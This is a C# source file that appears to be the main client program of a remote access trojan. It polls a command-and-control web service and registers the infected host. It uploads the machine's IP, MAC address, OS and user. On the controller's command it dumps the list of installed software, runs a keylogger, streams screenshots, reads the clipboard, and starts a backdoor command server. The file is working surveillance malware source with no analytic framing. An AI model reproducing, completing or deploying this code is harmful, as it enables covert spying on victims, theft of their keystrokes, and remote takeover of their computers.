using Microsoft.Win32;
using RatClient;
using System;
using System.Net;
using System.Threading;



namespace Client
{
    static class Program
    {
    

        public static Communicator A = new Communicator();
        
        public static string myName;
        private static bool Connected = false;
        private static bool Registered = false;
        private static bool Update = false;
        private static bool InstalledSoftwareBool = false;
        private static bool keydumpbool = false;
        private static bool scshare = false;

        private static Keylogger KeyLogObject;
        private static bool cmdkey = false;



        private static Thread ScreenShareThread = new Thread(new ThreadStart(ScreenShare));

        [STAThread]
        static void Main()
        {
           MainFunk();
        }

        private static void MainFunk()
        {
            while (true)
            {
                if (!Connected)
                {
                    Thread ConnectionThread = new Thread(new ThreadStart(ConnectToWS));
                    ConnectionThread.Start();
                    while (ConnectionThread.IsAlive)
                    {
                        Thread.Sleep(100);
                    };
                }
                else
                {
                    Thread IsRegisteredThread = new Thread(new ThreadStart(IsRegistered));
                    IsRegisteredThread.Start();
                    while (IsRegisteredThread.IsAlive)
                    {
                        Thread.Sleep(100);
                    };

                    if (!Registered)
                    {
                        Thread RegisterThread = new Thread(new ThreadStart(Register));
                        RegisterThread.Start();
                        while (RegisterThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };
                    }
                    else
                    {
                        #region UpdatePCData
                        Thread IfUpdateThread = new Thread(new ThreadStart(IfUpdate));
                        IfUpdateThread.Start();
                        while (IfUpdateThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (Update)
                        {
                            Thread UpdateDataThread = new Thread(new ThreadStart(UpdateData));
                            UpdateDataThread.Start();
                            while (UpdateDataThread.IsAlive)
                            {
                                Thread.Sleep(100);
                            };
                            A.SetForNoUpdate(myName);
                            Update = false;
                        }
                        #endregion

                        #region RegisteredSoftware
                        Thread IfRegisteredSoftwareThread = new Thread(new ThreadStart(IfInstalledAplicationDump));
                        IfRegisteredSoftwareThread.Start();
                        while (IfRegisteredSoftwareThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (InstalledSoftwareBool)
                        {
                            Thread DumpPassThread = new Thread(new ThreadStart(GetInstalledApplications));
                            DumpPassThread.Start();
                            while (DumpPassThread.IsAlive)
                            {
                                Thread.Sleep(100);
                            };
                            A.SetForNoApplicationDump(myName);
                            InstalledSoftwareBool = false;
                        }




                        #endregion

                        #region KeylogDump
                        Thread IfKeylogDumpThread = new Thread(new ThreadStart(IfKeylogDump));
                        IfKeylogDumpThread.Start();
                        while (IfRegisteredSoftwareThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (keydumpbool)
                        {
                            if (KeyLogObject == null)
                            { KeyLogObject = new Keylogger(); }

                            if (!KeyLogObject.started)
                            {
                                KeyLogObject.KeyloggerStart();
                            }
                        }
                        else
                        {
                            if (KeyLogObject != null)
                                if (KeyLogObject.started)
                                {
                                    KeyLogObject.Flush2File();
                                    KeyLogObject.KeyLogerStop();
                                }
                        }

                        #endregion

                        #region ScreenShare

                        Thread IfKeyScreenShareThread = new Thread(new ThreadStart(IfKeyScreenShare));
                        IfKeyScreenShareThread.Start();
                        while (IfKeyScreenShareThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (scshare)
                        {
                            if (!ScreenShareThread.IsAlive)
                            {
                                ScreenShareThread = new Thread(new ThreadStart(ScreenShare));
                                ScreenShareThread.Start();
                            }
                            string clip = System.Windows.Forms.Clipboard.GetText();
                            if (clip != "")
                            {
                                // co clipboard ne server
                            }
                        }
                        #endregion

                        #region CMDRUN

                        Thread IfCmdRunThread = new Thread(new ThreadStart(IfCmdRun));
                        IfCmdRunThread.Start();
                        while (IfCmdRunThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (cmdkey)
                        {
                            if (!Backdoor.started)
                            {
                              Backdoor.startServer();
                            }
                        }
                        else
                        {
                            if (Backdoor.started)
                            {
                                Backdoor.stopServer();
                            }
                        }
                        #endregion


                        Thread.Sleep(1000);
                    }
                }
                GC.Collect();
                Thread.Sleep(1000);
            }
        }


        private static void ConnectToWS()
        {
          

            try
            {
                myName = Client.HostIdentification.GetFingerPrint();
                A.AddUser(myName);
                Connected = true;
            }
            catch
            {
                Connected = false;
            }
        }// lidhu me webservice

        private static void IsRegistered()
        {
            try
            {
                Registered = A.IsRegistered(myName);
               
            }
            catch 
            {
                Registered = false;
                Connected = false;
            }
        }

        private static void Register()
        {
            try
            {
                A.Register(myName);
              
            }
            catch
            {
                Registered = false;
                Connected = false;
            }
        }

        private static void IfUpdate()
        {
            try
            {
                Update = A.IfUpdate(myName);
               
            }
            catch
            {
                Update = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void UpdateData()
        {
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Data-GlobalIP", "");
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Data-LocalIP", HostIdentification.GetLocalIP());
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Data-MachineName", HostIdentification.GetMachinename());
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Data-MachineOS", HostIdentification.GetMachineOS());
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Data-MACAddress", HostIdentification.GetMacAddr());
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Data-ActiveUser", HostIdentification.GetActiveUser());
            A.SetForNoUpdate(myName);

        }

     

     

        private static void IfInstalledAplicationDump()
        {
            try
            {
                InstalledSoftwareBool = A.IfInstalledAplicationDump(myName);
                
            }
            catch
            {
                InstalledSoftwareBool = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void GetInstalledApplications()
        {
            string OUTPUT = "";
            string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            using (Microsoft.Win32.RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key))
            {
                foreach (string subkey_name in key.GetSubKeyNames())
                {
                    using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                    {
                        OUTPUT += (subkey.GetValue("DisplayName")) + " | ";
                    }
                }
            }
            Program.A.RegisterValue(myName, "InstalledSoftware", OUTPUT);
            A.SetForNoApplicationDump(myName);
        }

        private static void IfKeylogDump()
        {
            try
            {
                keydumpbool = A.IfKeyLogDump(myName);
              
            }
            catch
            {
                keydumpbool = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void IfCmdRun()
        {
            try
            {
                cmdkey = A.IfCMDRun(myName);
               
            }
            catch
            {
                cmdkey = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void IfKeyScreenShare()
        {
            try
            {
                scshare = A.IfKeyScreenShare(myName);
               
            }
            catch
            {
                scshare = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void ScreenShare()
        {
            while (scshare)
            {
                A.SetMyScreen(ScreenCapture.CaptureScreen());
                Thread.Sleep(1000);
            }
        }
     
    }
}
